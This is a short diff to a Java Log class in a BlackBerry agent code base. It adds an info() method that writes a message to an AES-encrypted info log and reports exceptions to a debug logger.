@@ -19,6 +19,7 @@ import javax.microedition.io.file.FileConnection;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.Device;
 import blackberry.agent.Agent;
+import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -536,4 +537,20 @@ public final class Log {
 
         return writeLog(buffer);
     }
+    
+    public static void info(final String message, final int priority) {
+        try{
+        Log logInfo = new Log(Agent.AGENT_INFO, false, Keys.getInstance()
+                    .getAesKey());
+        
+        logInfo.createLog(null);
+        logInfo.writeLog(message, true);
+        logInfo.close();
+        }catch(Exception ex){
+            //#ifdef DEBUG_ERROR
+            debug.error(ex);
+            //#endif
+        }
+    }
+
 }
